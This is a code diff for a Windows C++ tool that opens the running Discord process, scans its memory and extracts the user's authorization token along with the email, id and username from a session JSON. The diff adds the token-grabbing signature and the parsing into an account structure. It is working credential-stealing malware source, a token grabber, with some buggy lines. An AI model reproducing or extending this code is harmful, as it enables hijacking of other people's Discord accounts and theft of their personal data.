@@ -161,18 +161,41 @@ uint32_t GetProcessBaseAddress(DWORD processID)
     return baseAddress;
 }
 
+void remove_extra_whitespaces(const std::string& input, std::string& output)
+{
+    output.clear();  // unless you want to add at the end of existing sring...
+    unique_copy(input.begin(), input.end(), std::back_insert_iterator<std::string>(output),
+        [](char a, char b) { return isspace(a) && isspace(b);});
+    std::cout << output << std::endl;
+}
+
+bool isToken(char tokenBuffer[]) {
+
+    // checks
+    //remove_extra_whitespaces(tokenBuffer, token);
+
+    if (tokenBuffer[3] == '.') {
+        return true;
+    }
+    else {
+        return false;
+    }
+}
 discordInformation procManager::scan() {
     // save information in discordInformation type
     discordInformation account;
-
     // JSON struct
     nlohmann::json accountJSON;
 
     // execution time
     std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now();
-    // signature
+    // signatures
     char json_sig[] = "\x7b\x22\x65\x6e\x76\x69\x72\x6f\x6e\x6d\x65\x6e\x74\x22";
+    char token_sig[] = "\x41\x75\x74\x68\x6F\x72\x69\x7A\x61\x74\x69\x6F\x6E\x00\x00\x00\x43";
     // Get the list of process identifiers.
+
+    // 5th result is always the token
+    int tokencount = 0;
 
     std::cout << "[+] Enumerating through all processes.." << std::endl;
 
@@ -184,13 +207,10 @@ discordInformation procManager::scan() {
         exit(EXIT_FAILURE); // error handling like a retard
     }
 
-
-    // Calculate how many process identifiers were returned.
-
+    // Calculate how many processes returned.
     cProcesses = cbNeeded / sizeof(DWORD);
 
-    // Print the name and process identifier for each process.
-
+    // loop trough every process and pass it to findProc to filter them out.
     for (i = 0; i < cProcesses; i++)
     {
         if (aProcesses[i] != 0)
@@ -199,10 +219,6 @@ discordInformation procManager::scan() {
         }
     }
     _tprintf(TEXT("[+] Skipped %u wrong process(es) \n"), count);
-
-    //
-    // scan part
-    // 
 
     // open handle to the right proc
     HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, procInfo.pid);
@@ -216,18 +232,18 @@ discordInformation procManager::scan() {
     rgninfo.BaseAddress;
 
     // allocate space to save json
-    char resultJSON[256];
+    char resultJSON[140];
+    char tokenJSON[128];
 
+    bool found = false;
 
-    // get base address (probaly not needed)
-    //char* base = (char*)GetProcessBaseAddress(procInfo.pid);
     char* base = (char*)GetProcessBaseAddress(procInfo.pid);
 
     std::cout << "[+] Reading .text section into buffer.." << std::endl;
     std::cout << "[+] Scanning.." << std::endl;
 
     while (base < info.lpMaximumApplicationAddress) {
-        // get info for section
+        // get info for the current section
         VirtualQueryEx(hproc, (LPCVOID)base, &rgninfo, sizeof(rgninfo));
 
         // check if current section is rw (read write)
@@ -238,19 +254,38 @@ discordInformation procManager::scan() {
             // set buffer as big as the section we scan trough.
             byte* local = new byte[rgninfo.RegionSize];
 
-            // read
+            // counting the bytes read.
             SIZE_T read = 0;
+            SIZE_T token_read = 0;
 
             // read memory into buffer
             ReadProcessMemory(hproc, base, local, rgninfo.RegionSize, &read);
 
             // pattern scan for the signature.
             uint32_t result = (uint32_t)scanner::Search(local, rgninfo.RegionSize, reinterpret_cast<const uint8_t*>(json_sig), strlen(json_sig), 0xCC);
+            uint32_t token_result = (uint32_t)scanner::Search(local, rgninfo.RegionSize, reinterpret_cast<const uint8_t*>(token_sig), strlen(token_sig), 0xCC);
 
+            // check if result has been found.
+            if (token_result != 0) 
+            {
+                // if token hasnt been found read token value, else ignore and wait for other value to be found.
+                if (!found) {
+                    uint32_t offset(token_result - (uint32_t)local);
 
+                    uint32_t token_add = ((uint32_t)rgninfo.BaseAddress + offset) + 0x18;
+
+                    // Read value from address
+                    ReadProcessMemory(hproc, (void*)token_add, tokenJSON, sizeof(tokenJSON), &read);
+                }
+                // validate token
+                if (isToken(tokenJSON)) found = true;
+
+            }
+
+            // check if result has been found.
             if (result != 0)
             {
-                // how many bytes we need to go from regionBase to the JSON start
+                // how many bytes we need to go from regionBase to the JSON start  
                 uint32_t offset = (result - (uint32_t)local);
 
                 // to read out a certain value which we dont use
@@ -258,55 +293,57 @@ discordInformation procManager::scan() {
 
                 // Read value from address
                 ReadProcessMemory(hproc, (void*)json_add, resultJSON, sizeof(resultJSON), &read);
-                std::string json = resultJSON;
-                // checks if result has id in the JSON to remove false positives
-                if (json.find("\"id\"") != std::string::npos) {
-                    std::cout << resultJSON << std::endl;
+
+                // validate value, if it has been found waiting for the token to also be found.
+                std::string result = resultJSON;
+                if (result.find("\"id\"") != std::string::npos && found) {
+                    break;
                 }
 
+
             }
+            // free memory.
             delete[] local;
         }
-        // add regionsize to the base address of the process
-        // since we already scanned trough that one
-        base += rgninfo.RegionSize;
+
+            // add regionsize to the base address of the process
+            // since we already scanned trough that one
+            base += rgninfo.RegionSize;
     }
 
-    // convert JSON to string
-/*    std::string JSONstring = json;
+        // convert JSON to string
+        std::string JSONstring = resultJSON;
 
-    // convert string to json object
-    accountJSON = nlohmann::json::parse(JSONstring);
+        // convert string to json object
+        accountJSON = nlohmann::json::parse(JSONstring);
 
-    // convert JSON object to discordInformation struct
+        // convert them all to string again
+        std::string environment = accountJSON["environment"];
+        std::string release = accountJSON["release"];
+        std::string email = accountJSON["user"]["email"];
+        std::string id = accountJSON["user"]["id"];
+        std::string username = accountJSON["user"]["username"];
+        std::string token = tokenJSON;
 
-    // convert them all to string again
-    std::string environment = accountJSON["environment"];
-    std::string release     = accountJSON["release"];
-    std::string email       = accountJSON["user"]["email"];
-    std::string id          = accountJSON["user"]["id"];
-    std::string username    = accountJSON["user"]["username"];
+        // remove last character. (corrupted).
+        token.substr(0, token.length() - 2);
 
-    // pass string to struct
-    account.environment = environment;
-    account.release = release;
-    account.user.email = email;
-    account.user.id = id;
-    account.user.username = username;
-    */
+        // pass string to struct
+        account.environment = environment;
+        account.release = release;
+        account.user.email = email;
+        account.user.id = id;
+        account.user.username = username;
+        account.user.token = token; 
 
+        // execution time end
+        std::chrono::steady_clock::time_point end = std::chrono::steady_clock::now();
 
+        std::cout << "[+] Done in " << (std::chrono::duration_cast<std::chrono::microseconds>(end - begin).count()) / 1000000.0 << "ms" << std::endl;
 
-    // execution time end
-    std::chrono::steady_clock::time_point end = std::chrono::steady_clock::now();
+        // close handle
+        CloseHandle(hproc);
 
-    std::cout << "[+] Done in " << (std::chrono::duration_cast<std::chrono::microseconds>(end - begin).count()) / 1000000.0 << "ms" << std::endl;
-    
-
-
-    // close handle
-    CloseHandle(hproc);
-
-    // return values
-    return account;
+        // return values
+        return account;
 }
